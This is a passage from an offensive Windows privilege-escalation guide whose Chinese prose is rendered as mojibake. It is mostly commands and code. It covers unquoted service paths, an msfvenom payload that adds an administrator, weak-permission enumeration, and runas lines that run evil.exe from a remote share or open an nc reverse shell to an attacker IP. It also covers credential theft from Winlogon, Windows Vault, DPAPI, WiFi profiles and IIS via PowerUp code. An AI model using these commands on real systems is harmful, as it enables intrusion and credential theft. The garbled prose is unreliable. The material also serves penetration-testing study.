<p>å¦‚æœå¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„æ²¡æœ‰ç”¨å¼•å·æ‹¬èµ·æ¥ï¼ŒWindows å°†å°è¯•æ‰§è¡Œæ¯ä¸ªåœ¨ç©ºæ ¼ä¹‹å‰çš„ç»“å°¾ã€‚</p>
<p>ä¾‹å¦‚ï¼Œå¯¹äºè·¯å¾„ <em>C:\Program Files\Some Folder\Service.exe</em>ï¼ŒWindows å°†å°è¯•æ‰§è¡Œï¼š</p>
<pre><code class="language-powershell">C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
</code></pre>
<p>åˆ—å‡ºæ‰€æœ‰æœªåŠ å¼•å·çš„æœåŠ¡è·¯å¾„ï¼Œæ’é™¤å±äºå†…ç½®WindowsæœåŠ¡çš„è·¯å¾„ï¼š</p>
<pre><code class="language-powershell">wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
</code></pre>
<pre><code class="language-powershell">for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" &gt;nul 2&gt;&amp;1 &amp;&amp; (echo %%n &amp;&amp; echo %%~s &amp;&amp; icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") &amp;&amp; echo.
)
)
</code></pre>
<pre><code class="language-powershell">gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
</code></pre>
<p><strong>æ‚¨å¯ä»¥ä½¿ç”¨</strong> metasploit æ£€æµ‹å’Œåˆ©ç”¨æ­¤æ¼æ´ï¼š <code>exploit/windows/local/trusted\_service\_path</code> æ‚¨å¯ä»¥æ‰‹åŠ¨åˆ›å»ºä¸€ä¸ªæœåŠ¡äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½¿ç”¨ metasploitï¼š</p>
<pre><code class="language-bash">msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
</code></pre>
<h3 id="æ¢å¤æ“ä½œ"><a class="header" href="#æ¢å¤æ“ä½œ">æ¢å¤æ“ä½œ</a></h3>
<p>Windows å…è®¸ç”¨æˆ·æŒ‡å®šåœ¨æœåŠ¡å¤±è´¥æ—¶é‡‡å–çš„æ“ä½œã€‚æ­¤åŠŸèƒ½å¯ä»¥é…ç½®ä¸ºæŒ‡å‘ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ã€‚å¦‚æœè¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶æ˜¯å¯æ›¿æ¢çš„ï¼Œå¯èƒ½ä¼šå®ç°æƒé™æå‡ã€‚æ›´å¤šç»†èŠ‚å¯ä»¥åœ¨ <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN">å®˜æ–¹æ–‡æ¡£</a> ä¸­æ‰¾åˆ°ã€‚</p>
<h2 id="åº”ç”¨ç¨‹åº"><a class="header" href="#åº”ç”¨ç¨‹åº">åº”ç”¨ç¨‹åº</a></h2>
<h3 id="å·²å®‰è£…çš„åº”ç”¨ç¨‹åº"><a class="header" href="#å·²å®‰è£…çš„åº”ç”¨ç¨‹åº">å·²å®‰è£…çš„åº”ç”¨ç¨‹åº</a></h3>
<p>æ£€æŸ¥ <strong>äºŒè¿›åˆ¶æ–‡ä»¶çš„æƒé™</strong>ï¼ˆä¹Ÿè®¸ä½ å¯ä»¥è¦†ç›–ä¸€ä¸ªå¹¶æå‡æƒé™ï¼‰å’Œ <strong>æ–‡ä»¶å¤¹</strong> (<a href="dll-hijacking/">DLL Hijacking</a>)ã€‚</p>
<pre><code class="language-bash">dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
</code></pre>
<h3 id="å†™æƒé™"><a class="header" href="#å†™æƒé™">å†™æƒé™</a></h3>
<p>æ£€æŸ¥æ‚¨æ˜¯å¦å¯ä»¥ä¿®æ”¹æŸäº›é…ç½®æ–‡ä»¶ä»¥è¯»å–æŸäº›ç‰¹æ®Šæ–‡ä»¶ï¼Œæˆ–è€…æ‚¨æ˜¯å¦å¯ä»¥ä¿®æ”¹å°†ç”±ç®¡ç†å‘˜å¸æˆ·ï¼ˆschedtasksï¼‰æ‰§è¡Œçš„æŸäº›äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p>
<p>æŸ¥æ‰¾ç³»ç»Ÿä¸­å¼±æ–‡ä»¶å¤¹/æ–‡ä»¶æƒé™çš„ä¸€ç§æ–¹æ³•æ˜¯ï¼š</p>
<pre><code class="language-bash">accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
</code></pre>
<pre><code class="language-bash">icacls "C:\Program Files\*" 2&gt;nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2&gt;nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
</code></pre>
<pre><code class="language-bash">Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
</code></pre>
<h3 id="å¯åŠ¨æ—¶è¿è¡Œ"><a class="header" href="#å¯åŠ¨æ—¶è¿è¡Œ">å¯åŠ¨æ—¶è¿è¡Œ</a></h3>
<p><strong>æ£€æŸ¥æ‚¨æ˜¯å¦å¯ä»¥è¦†ç›–æŸäº›å°†ç”±ä¸åŒç”¨æˆ·æ‰§è¡Œçš„æ³¨å†Œè¡¨æˆ–äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</strong><br />
<strong>é˜…è¯»</strong>ä»¥ä¸‹é¡µé¢ä»¥äº†è§£æœ‰å…³æœ‰è¶£çš„<strong>è‡ªåŠ¨è¿è¡Œä½ç½®ä»¥æå‡æƒé™</strong>çš„æ›´å¤šä¿¡æ¯ï¼š</p>
<p>{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
<a href="privilege-escalation-with-autorun-binaries.html">privilege-escalation-with-autorun-binaries.md</a>
{% endcontent-ref %}</p>
<h3 id="é©±åŠ¨ç¨‹åº"><a class="header" href="#é©±åŠ¨ç¨‹åº">é©±åŠ¨ç¨‹åº</a></h3>
<p>å¯»æ‰¾å¯èƒ½çš„<strong>ç¬¬ä¸‰æ–¹å¥‡æ€ª/æ˜“å—æ”»å‡»</strong>é©±åŠ¨ç¨‹åº</p>
<pre><code class="language-bash">driverquery
driverquery.exe /fo table
driverquery /SI
</code></pre>
<h2 id="path-dll-åŠ«æŒ"><a class="header" href="#path-dll-åŠ«æŒ">PATH DLL åŠ«æŒ</a></h2>
<p>å¦‚æœæ‚¨åœ¨ PATH ä¸­çš„æŸä¸ªæ–‡ä»¶å¤¹å†…å…·æœ‰ <strong>å†™å…¥æƒé™</strong>ï¼Œæ‚¨å¯èƒ½èƒ½å¤ŸåŠ«æŒç”±è¿›ç¨‹åŠ è½½çš„ DLL å¹¶ <strong>æå‡æƒé™</strong>ã€‚</p>
<p>æ£€æŸ¥ PATH ä¸­æ‰€æœ‰æ–‡ä»¶å¤¹çš„æƒé™ï¼š</p>
<pre><code class="language-bash">for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2&gt;nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" &amp;&amp; echo. )
</code></pre>
<p>æœ‰å…³å¦‚ä½•æ»¥ç”¨æ­¤æ£€æŸ¥çš„æ›´å¤šä¿¡æ¯ï¼š</p>
<p>{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
<a href="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.html">writable-sys-path-+dll-hijacking-privesc.md</a>
{% endcontent-ref %}</p>
<h2 id="ç½‘ç»œ"><a class="header" href="#ç½‘ç»œ">ç½‘ç»œ</a></h2>
<h3 id="å…±äº«"><a class="header" href="#å…±äº«">å…±äº«</a></h3>
<pre><code class="language-bash">net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
</code></pre>
<h3 id="hosts-file"><a class="header" href="#hosts-file">hosts file</a></h3>
<p>æ£€æŸ¥ hosts æ–‡ä»¶ä¸­ç¡¬ç¼–ç çš„å…¶ä»–å·²çŸ¥è®¡ç®—æœº</p>
<pre><code>type C:\Windows\System32\drivers\etc\hosts
</code></pre>
<h3 id="ç½‘ç»œæ¥å£ä¸dns"><a class="header" href="#ç½‘ç»œæ¥å£ä¸dns">ç½‘ç»œæ¥å£ä¸DNS</a></h3>
<pre><code>ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
</code></pre>
<h3 id="å¼€æ”¾ç«¯å£"><a class="header" href="#å¼€æ”¾ç«¯å£">å¼€æ”¾ç«¯å£</a></h3>
<p>æ£€æŸ¥å¤–éƒ¨çš„ <strong>å—é™æœåŠ¡</strong></p>
<pre><code class="language-bash">netstat -ano #Opened ports?
</code></pre>
<h3 id="è·¯ç”±è¡¨"><a class="header" href="#è·¯ç”±è¡¨">è·¯ç”±è¡¨</a></h3>
<pre><code>route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
</code></pre>
<h3 id="arp-è¡¨"><a class="header" href="#arp-è¡¨">ARP è¡¨</a></h3>
<pre><code>arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
</code></pre>
<h3 id="é˜²ç«å¢™è§„åˆ™"><a class="header" href="#é˜²ç«å¢™è§„åˆ™">é˜²ç«å¢™è§„åˆ™</a></h3>
<p><a href="../basic-cmd-for-pentesters.html#firewall"><strong>æŸ¥çœ‹æ­¤é¡µé¢ä»¥è·å–ä¸é˜²ç«å¢™ç›¸å…³çš„å‘½ä»¤</strong></a> <strong>(åˆ—å‡ºè§„åˆ™ï¼Œåˆ›å»ºè§„åˆ™ï¼Œå…³é—­ï¼Œå…³é—­...)</strong></p>
<p>æ›´å¤š<a href="../basic-cmd-for-pentesters.html#network">ç½‘ç»œæšä¸¾å‘½ä»¤åœ¨è¿™é‡Œ</a></p>
<h3 id="windows-å­ç³»ç»Ÿ-for-linux-wsl"><a class="header" href="#windows-å­ç³»ç»Ÿ-for-linux-wsl">Windows å­ç³»ç»Ÿ for Linux (wsl)</a></h3>
<pre><code class="language-bash">C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
</code></pre>
<p>Binary <code>bash.exe</code> ä¹Ÿå¯ä»¥åœ¨ <code>C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe</code> ä¸­æ‰¾åˆ°ã€‚</p>
<p>å¦‚æœä½ è·å¾—äº† root ç”¨æˆ·æƒé™ï¼Œä½ å¯ä»¥åœ¨ä»»ä½•ç«¯å£ä¸Šç›‘å¬ï¼ˆç¬¬ä¸€æ¬¡ä½¿ç”¨ <code>nc.exe</code> åœ¨ç«¯å£ä¸Šç›‘å¬æ—¶ï¼Œå®ƒä¼šé€šè¿‡ GUI è¯¢é—®æ˜¯å¦å…è®¸ <code>nc</code> é€šè¿‡é˜²ç«å¢™ï¼‰ã€‚</p>
<pre><code class="language-bash">wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
</code></pre>
<p>è¦è½»æ¾ä»¥ root èº«ä»½å¯åŠ¨ bashï¼Œæ‚¨å¯ä»¥å°è¯• <code>--default-user root</code></p>
<p>æ‚¨å¯ä»¥åœ¨æ–‡ä»¶å¤¹ <code>C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\</code> ä¸­æµè§ˆ <code>WSL</code> æ–‡ä»¶ç³»ç»Ÿ</p>
<h2 id="windows-å‡­æ®"><a class="header" href="#windows-å‡­æ®">Windows å‡­æ®</a></h2>
<h3 id="winlogon-å‡­æ®"><a class="header" href="#winlogon-å‡­æ®">Winlogon å‡­æ®</a></h3>
<pre><code class="language-bash">reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2&gt;nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
</code></pre>
<h3 id="å‡­æ®ç®¡ç†å™¨--windows-vault"><a class="header" href="#å‡­æ®ç®¡ç†å™¨--windows-vault">å‡­æ®ç®¡ç†å™¨ / Windows Vault</a></h3>
<p>æ¥è‡ª <a href="https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault">https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault</a><br />
Windows Vault å­˜å‚¨ç”¨æˆ·åœ¨æœåŠ¡å™¨ã€ç½‘ç«™å’Œå…¶ä»–ç¨‹åºçš„å‡­æ®ï¼Œ<strong>Windows</strong> å¯ä»¥ <strong>è‡ªåŠ¨ç™»å½•ç”¨æˆ·</strong>ã€‚ä¹ä¸€çœ‹ï¼Œè¿™å¯èƒ½çœ‹èµ·æ¥åƒæ˜¯ç”¨æˆ·å¯ä»¥å­˜å‚¨ä»–ä»¬çš„ Facebook å‡­æ®ã€Twitter å‡­æ®ã€Gmail å‡­æ®ç­‰ï¼Œä»¥ä¾¿ä»–ä»¬é€šè¿‡æµè§ˆå™¨è‡ªåŠ¨ç™»å½•ã€‚ä½†äº‹å®å¹¶éå¦‚æ­¤ã€‚</p>
<p>Windows Vault å­˜å‚¨ Windows å¯ä»¥è‡ªåŠ¨ç™»å½•ç”¨æˆ·çš„å‡­æ®ï¼Œè¿™æ„å‘³ç€ä»»ä½• <strong>éœ€è¦å‡­æ®æ¥è®¿é—®èµ„æº</strong>ï¼ˆæœåŠ¡å™¨æˆ–ç½‘ç«™ï¼‰çš„ <strong>Windows åº”ç”¨ç¨‹åº</strong> <strong>éƒ½å¯ä»¥åˆ©ç”¨è¿™ä¸ªå‡­æ®ç®¡ç†å™¨</strong> å’Œ Windows Vaultï¼Œå¹¶ä½¿ç”¨æä¾›çš„å‡­æ®ï¼Œè€Œä¸æ˜¯ç”¨æˆ·æ¯æ¬¡éƒ½è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ã€‚</p>
<p>é™¤éåº”ç”¨ç¨‹åºä¸å‡­æ®ç®¡ç†å™¨äº¤äº’ï¼Œå¦åˆ™æˆ‘è®¤ä¸ºå®ƒä»¬ä¸å¯èƒ½ä½¿ç”¨ç»™å®šèµ„æºçš„å‡­æ®ã€‚å› æ­¤ï¼Œå¦‚æœæ‚¨çš„åº”ç”¨ç¨‹åºæƒ³è¦ä½¿ç”¨ Vaultï¼Œå®ƒåº”è¯¥ä»¥æŸç§æ–¹å¼ <strong>ä¸å‡­æ®ç®¡ç†å™¨é€šä¿¡å¹¶è¯·æ±‚è¯¥èµ„æºçš„å‡­æ®</strong> ä»é»˜è®¤å­˜å‚¨ Vaultã€‚</p>
<p>ä½¿ç”¨ <code>cmdkey</code> åˆ—å‡ºæœºå™¨ä¸Šå­˜å‚¨çš„å‡­æ®ã€‚</p>
<pre><code class="language-bash">cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
</code></pre>
<p>ç„¶åæ‚¨å¯ä»¥ä½¿ç”¨ <code>runas</code> å‘½ä»¤å’Œ <code>/savecred</code> é€‰é¡¹æ¥ä½¿ç”¨ä¿å­˜çš„å‡­æ®ã€‚ä»¥ä¸‹ç¤ºä¾‹é€šè¿‡ SMB å…±äº«è°ƒç”¨è¿œç¨‹äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p>
<pre><code class="language-bash">runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
</code></pre>
<p>ä½¿ç”¨ <code>runas</code> å’Œæä¾›çš„å‡­æ®ã€‚</p>
<pre><code class="language-bash">C:\Windows\System32\runas.exe /env /noprofile /user:&lt;username&gt; &lt;password&gt; "c:\users\Public\nc.exe -nc &lt;attacker-ip&gt; 4444 -e cmd.exe"
</code></pre>
<p>æ³¨æ„ï¼Œmimikatzã€lazagneã€<a href="https://www.nirsoft.net/utils/credentials_file_view.html">credentialfileview</a>ã€<a href="https://www.nirsoft.net/utils/vault_password_view.html">VaultPasswordView</a> æˆ–æ¥è‡ª <a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1">Empire Powershells module</a>ã€‚</p>
<h3 id="dpapi"><a class="header" href="#dpapi">DPAPI</a></h3>
<p><strong>æ•°æ®ä¿æŠ¤ API (DPAPI)</strong> æä¾›äº†ä¸€ç§å¯¹ç§°åŠ å¯†æ•°æ®çš„æ–¹æ³•ï¼Œä¸»è¦ç”¨äº Windows æ“ä½œç³»ç»Ÿä¸­å¯¹éå¯¹ç§°ç§é’¥çš„å¯¹ç§°åŠ å¯†ã€‚æ­¤åŠ å¯†åˆ©ç”¨ç”¨æˆ·æˆ–ç³»ç»Ÿç§˜å¯†æ˜¾è‘—å¢åŠ ç†µã€‚</p>
<p><strong>DPAPI é€šè¿‡ä»ç”¨æˆ·çš„ç™»å½•ç§˜å¯†æ´¾ç”Ÿçš„å¯¹ç§°å¯†é’¥æ¥å®ç°å¯†é’¥çš„åŠ å¯†</strong>ã€‚åœ¨æ¶‰åŠç³»ç»ŸåŠ å¯†çš„åœºæ™¯ä¸­ï¼Œå®ƒåˆ©ç”¨ç³»ç»Ÿçš„åŸŸè®¤è¯ç§˜å¯†ã€‚</p>
<p>ä½¿ç”¨ DPAPI åŠ å¯†çš„ç”¨æˆ· RSA å¯†é’¥å­˜å‚¨åœ¨ <code>%APPDATA%\Microsoft\Protect\{SID}</code> ç›®å½•ä¸­ï¼Œå…¶ä¸­ <code>{SID}</code> ä»£è¡¨ç”¨æˆ·çš„ <a href="https://en.wikipedia.org/wiki/Security_Identifier">å®‰å…¨æ ‡è¯†ç¬¦</a>ã€‚<strong>DPAPI å¯†é’¥ä¸ä¿æŠ¤ç”¨æˆ·ç§é’¥çš„ä¸»å¯†é’¥ä½äºåŒä¸€æ–‡ä»¶ä¸­</strong>ï¼Œé€šå¸¸ç”± 64 å­—èŠ‚çš„éšæœºæ•°æ®ç»„æˆã€‚ï¼ˆé‡è¦çš„æ˜¯è¦æ³¨æ„ï¼Œè¯¥ç›®å½•çš„è®¿é—®å—åˆ°é™åˆ¶ï¼Œæ— æ³•é€šè¿‡ CMD ä¸­çš„ <code>dir</code> å‘½ä»¤åˆ—å‡ºå…¶å†…å®¹ï¼Œä½†å¯ä»¥é€šè¿‡ PowerShell åˆ—å‡ºï¼‰ã€‚</p>
<pre><code class="language-powershell">Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
</code></pre>
<p>æ‚¨å¯ä»¥ä½¿ç”¨ <strong>mimikatz module</strong> <code>dpapi::masterkey</code> å’Œé€‚å½“çš„å‚æ•° (<code>/pvk</code> æˆ– <code>/rpc</code>) æ¥è§£å¯†å®ƒã€‚</p>
<p><strong>å—ä¸»å¯†ç ä¿æŠ¤çš„å‡­æ®æ–‡ä»¶</strong> é€šå¸¸ä½äºï¼š</p>
<pre><code class="language-powershell">dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
</code></pre>
<p>æ‚¨å¯ä»¥ä½¿ç”¨ <strong>mimikatz module</strong> <code>dpapi::cred</code> å’Œé€‚å½“çš„ <code>/masterkey</code> è¿›è¡Œè§£å¯†ã€‚<br />
æ‚¨å¯ä»¥ä½¿ç”¨ <code>sekurlsa::dpapi</code> æ¨¡å—ä» <strong>å†…å­˜</strong> ä¸­æå–è®¸å¤š <strong>DPAPI</strong> <strong>masterkeys</strong>ï¼ˆå¦‚æœæ‚¨æ˜¯ rootï¼‰ã€‚</p>
<p>{% content-ref url="dpapi-extracting-passwords.md" %}
<a href="dpapi-extracting-passwords.html">dpapi-extracting-passwords.md</a>
{% endcontent-ref %}</p>
<h3 id="powershell-å‡­æ®"><a class="header" href="#powershell-å‡­æ®">PowerShell å‡­æ®</a></h3>
<p><strong>PowerShell å‡­æ®</strong> é€šå¸¸ç”¨äº <strong>è„šæœ¬</strong> å’Œè‡ªåŠ¨åŒ–ä»»åŠ¡ï¼Œä»¥ä¾¿æ–¹ä¾¿åœ°å­˜å‚¨åŠ å¯†å‡­æ®ã€‚è¿™äº›å‡­æ®ä½¿ç”¨ <strong>DPAPI</strong> è¿›è¡Œä¿æŠ¤ï¼Œè¿™é€šå¸¸æ„å‘³ç€å®ƒä»¬åªèƒ½ç”±åœ¨åŒä¸€è®¡ç®—æœºä¸Šåˆ›å»ºå®ƒä»¬çš„åŒä¸€ç”¨æˆ·è§£å¯†ã€‚</p>
<p>è¦ä»åŒ…å« PS å‡­æ®çš„æ–‡ä»¶ä¸­ <strong>è§£å¯†</strong> å‡­æ®ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œï¼š</p>
<pre><code class="language-powershell">PS C:\&gt; $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\&gt; $credential.GetNetworkCredential().username

john

PS C:\htb&gt; $credential.GetNetworkCredential().password

JustAPWD!
</code></pre>
<h3 id="wifi"><a class="header" href="#wifi">Wifi</a></h3>
<pre><code class="language-bash">#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile &lt;SSID&gt; key=clear
#Oneliner to extract all wifi passwords
cls &amp; echo. &amp; for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off &gt; nul &amp; (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" &amp; echo.) &amp; @echo on*
</code></pre>
<h3 id="ä¿å­˜çš„-rdp-è¿æ¥"><a class="header" href="#ä¿å­˜çš„-rdp-è¿æ¥">ä¿å­˜çš„ RDP è¿æ¥</a></h3>
<p>æ‚¨å¯ä»¥åœ¨ <code>HKEY_USERS\&lt;SID&gt;\Software\Microsoft\Terminal Server Client\Servers\</code><br />
å’Œ <code>HKCU\Software\Microsoft\Terminal Server Client\Servers\</code> ä¸­æ‰¾åˆ°å®ƒä»¬ã€‚</p>
<h3 id="æœ€è¿‘è¿è¡Œçš„å‘½ä»¤"><a class="header" href="#æœ€è¿‘è¿è¡Œçš„å‘½ä»¤">æœ€è¿‘è¿è¡Œçš„å‘½ä»¤</a></h3>
<pre><code>HCU\&lt;SID&gt;\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\&lt;SID&gt;\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
</code></pre>
<h3 id="è¿œç¨‹æ¡Œé¢å‡­æ®ç®¡ç†å™¨"><a class="header" href="#è¿œç¨‹æ¡Œé¢å‡­æ®ç®¡ç†å™¨"><strong>è¿œç¨‹æ¡Œé¢å‡­æ®ç®¡ç†å™¨</strong></a></h3>
<pre><code>%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
</code></pre>
<p>ä½¿ç”¨ <strong>Mimikatz</strong> <code>dpapi::rdg</code> æ¨¡å—å’Œé€‚å½“çš„ <code>/masterkey</code> æ¥ <strong>è§£å¯†ä»»ä½• .rdg æ–‡ä»¶</strong><br />
æ‚¨å¯ä»¥ä½¿ç”¨ Mimikatz <code>sekurlsa::dpapi</code> æ¨¡å— <strong>ä»å†…å­˜ä¸­æå–è®¸å¤š DPAPI ä¸»å¯†é’¥</strong></p>
<h3 id="ä¾¿ç­¾"><a class="header" href="#ä¾¿ç­¾">ä¾¿ç­¾</a></h3>
<p>äººä»¬ç»å¸¸åœ¨ Windows å·¥ä½œç«™ä¸Šä½¿ç”¨ä¾¿ç­¾åº”ç”¨ç¨‹åºæ¥ <strong>ä¿å­˜å¯†ç </strong> å’Œå…¶ä»–ä¿¡æ¯ï¼Œè€Œæ²¡æœ‰æ„è¯†åˆ°å®ƒæ˜¯ä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶ã€‚è¯¥æ–‡ä»¶ä½äº <code>C:\Users\&lt;user&gt;\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite</code>ï¼Œå§‹ç»ˆå€¼å¾—æœç´¢å’Œæ£€æŸ¥ã€‚</p>
<h3 id="appcmdexe"><a class="header" href="#appcmdexe">AppCmd.exe</a></h3>
<p><strong>è¯·æ³¨æ„ï¼Œè¦ä» AppCmd.exe æ¢å¤å¯†ç ï¼Œæ‚¨éœ€è¦æ˜¯ç®¡ç†å‘˜å¹¶åœ¨é«˜å®Œæ•´æ€§çº§åˆ«ä¸‹è¿è¡Œã€‚</strong><br />
<strong>AppCmd.exe</strong> ä½äº <code>%systemroot%\system32\inetsrv\</code> ç›®å½•ä¸­ã€‚<br />
å¦‚æœè¯¥æ–‡ä»¶å­˜åœ¨ï¼Œåˆ™å¯èƒ½å·²ç»é…ç½®äº†ä¸€äº› <strong>å‡­æ®</strong> å¹¶å¯ä»¥ <strong>æ¢å¤</strong>ã€‚</p>
<p>æ­¤ä»£ç æå–è‡ª <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1"><strong>PowerUP</strong></a>ï¼š</p>
<pre><code class="language-bash">function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

